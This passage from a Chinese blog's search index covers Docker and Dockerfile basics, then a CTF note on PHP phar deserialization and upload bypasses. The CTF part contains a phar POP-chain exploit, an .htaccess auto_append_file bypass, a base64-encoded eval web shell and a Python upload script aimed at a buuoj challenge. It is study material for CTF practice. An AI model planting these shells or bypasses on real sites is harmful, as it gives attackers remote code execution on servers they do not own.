nginx:v1<br></code></pre></td></tr></table></figure><blockquote><p>意思是启动一个名字为docker_nginx_v1的容器，使用nginx:v1镜像，并将本机127.0.0.1:5001映射到该容器的80端口(因为nginx的默认端口是<strong>80</strong>)，因此建立成功后可以从127.0.0.1:5001访问该环境</p><p>注：</p><p>1.容器默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在容器的端口后面加上 &#x2F;udp</p><p>2.-d:在后台运行</p><p>3.-it:交互式方式运行</p><p>4.-p:指定端口</p></blockquote><p><code>docker ps</code>查看正在运行的容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CONTAINER</span> ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES<br><span class="hljs-attribute">dd0c50ae3ef8</span>   nginx:v1   <span class="hljs-string">&quot;/docker-entrypoint.…&quot;</span>   <span class="hljs-number">4</span> seconds ago   Up <span class="hljs-number">3</span> seconds   <span class="hljs-number">127.0.0.1:5001</span>-&gt;<span class="hljs-number">80</span>/tcp   docker_nginx_v1<br></code></pre></td></tr></table></figure><p>访问127.0.0.1:5001</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg" alt="image-20220501191611894"></p><p>dockerfile的内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span><br></code></pre></td></tr></table></figure><h2 id="使用dockerfile构建镜像"><a href="#使用dockerfile构建镜像" class="headerlink" title="使用dockerfile构建镜像"></a>使用dockerfile构建镜像</h2><p>Dockerfile整体就两类语句组成：</p><ul><li># Comment 注释信息</li><li>Instruction arguments 指令 参数，一行一个指令。</li></ul><p>⚠️</p><ol><li>Dockerfile文件名<strong>首字母必须大写</strong>。</li><li>Dockerfile指令不区分大小写，但是为方便和参数做区分，通常<strong>指令使用大写字母。</strong></li><li>Dockerfile中指令按顺序从上至下依次执行。</li><li>Dockerfile中第一个非注释行必须是<strong>FROM指令</strong>，用来指定制作当前镜像依据的是哪个基础镜像。</li><li>Dockerfile中需要调用的文件必须跟Dockerfile文件在同一目录下，或者在其子目录下，父目录或者其它路径无效。</li></ol><h3 id="FROM和RUN"><a href="#FROM和RUN" class="headerlink" title="FROM和RUN"></a>FROM和RUN</h3><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell格式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> &lt;命令行命令&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>&lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</p></blockquote><p>exec格式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>, <span class="hljs-string">&quot;参数1&quot;</span>, <span class="hljs-string">&quot;参数2&quot;</span>]</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> [<span class="hljs-string">&quot;./test.php&quot;</span>, <span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;offline&quot;</span>] </span><br><span class="hljs-comment"># 等价于 RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure><blockquote><p>如果有多条命令执行，不要分成多个RUN语句，dockerfile的指令每执行一次都会在 docker 上新建一层，过多无意义的层，会造成镜像膨胀过大</p><p>正确写法是用<code>\</code>表示分行，<code>&amp;&amp;</code>链接命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install wget \</span><br><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>复制指令，可以从上下文目录中复制文件或目录到容器内指定路径</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;源路径1&gt;</span>...  <span class="hljs-attribute">&lt;目标路径&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;源路径1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;目标路径&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><ul><li><p>**[–chown&#x3D;<user>:<group>]**：可选参数，用户改变复制到容器内文件的拥有者和属组</p></li><li><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">pattern:<br>&#123; term &#125;<br>term:<br><span class="hljs-string">&#x27;*&#x27;</span>                                  匹配<span class="hljs-number">0</span>或多个非路径分隔符的字符<br><span class="hljs-string">&#x27;?&#x27;</span>                                  匹配<span class="hljs-number">1</span>个非路径分隔符的字符<br><span class="hljs-string">&#x27;[&#x27;</span> [ <span class="hljs-string">&#x27;^&#x27;</span> ] &#123; character-<span class="hljs-built_in">range</span> &#125; <span class="hljs-string">&#x27;]&#x27;</span>  字符组（必须非空）<br><span class="hljs-keyword">c</span>                                    匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>）<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>                               匹配字符<span class="hljs-keyword">c</span><br>character-<span class="hljs-built_in">range</span>:<br><span class="hljs-keyword">c</span>           匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>）<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>      匹配字符<span class="hljs-keyword">c</span><br><span class="hljs-keyword">lo</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">hi</span>   匹配区间[<span class="hljs-keyword">lo</span>, <span class="hljs-keyword">hi</span>]内的字符<br><br></code></pre></td></tr></table></figure></li><li><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，<u>路径不存在的话，会自动创建</u>。</p></li></ul><h2 id="镜像源拉取超时问题"><a href="#镜像源拉取超时问题" class="headerlink" title="镜像源拉取超时问题"></a>镜像源拉取超时问题</h2><p>将dockerfile中的</p><p><a href="http://link.zhihu.com/?target=http://k8s.gcr.io">k8s.gcr.io</a> —&gt; lank8s.cn<br><a href="http://link.zhihu.com/?target=http://gcr.io">gcr.io</a> –&gt; gcr.lank8s.cn</p>]]></content>
      
      
      <categories>
          
          <category> utils </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>1.a stub<br>    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件<br>2.a manifest describing the contents<br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<br>3.the file contents—被压缩文件的内容<br>4.[optional] a signature for verifying Phar integrity (phar file format only)—签名，放在文件末尾</p><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>会在同目录生成 phar.phar 文件</p><p>注意：要想生成phar文件，必须将phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加. 否则无法生成phar文件</p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>meta-data是以序列化的形式存储的</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，测试后受影响的函数如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg" alt="image-20211018194419673"></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="hljs-comment">//flag所在路径</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//为了不存在的调用触发__get()</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发__toString()</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加图片类型文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//meta-data储存的信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><blockquote><p>要想生成phar文件，必须将php.ini中phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加.</p><p>生成的phar中metada.bin内容为类序列化后的内容</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过-lt-过滤"><a href="#绕过-lt-过滤" class="headerlink" title="绕过&lt;?过滤"></a>绕过&lt;?过滤</h3><p>.htaccess绕过文件头检查</p><p>如果用一般的<code>GIF89a</code>文件头绕过，会导致htaccess文件无法执行，因此这里用定义高度与宽度，#在htaccess中被视为注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br>#define height 1337<br>AddType application/x-httpd-php .a<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;<br></code></pre></td></tr></table></figure><p>shell.a内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11<br>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><blockquote><p>文件头后加的内容是为了补足8个字节，满足base64编码规则</p></blockquote><h3 id="文件上传python脚本"><a href="#文件上传python脚本" class="headerlink" title="文件上传python脚本"></a>文件上传python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-comment"># 执行get_the_flag函数</span><br>session = requests.session()<br>htaccess_content = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337</span><br><span class="hljs-string">AddType application/x-httpd-php .a</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>files_htaccess = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_hta = session.post(url, files=files_htaccess)<br><span class="hljs-built_in">print</span>(res_hta.text)<br>shell_file = <span class="hljs-string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span><br>files_shell = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;shell.a&#x27;</span>, shell_file, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_jpg = session.post(url, files=files_shell)<br><br><span class="hljs-built_in">print</span>(res_jpg.text)  <span class="hljs-comment"># 打印路径</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
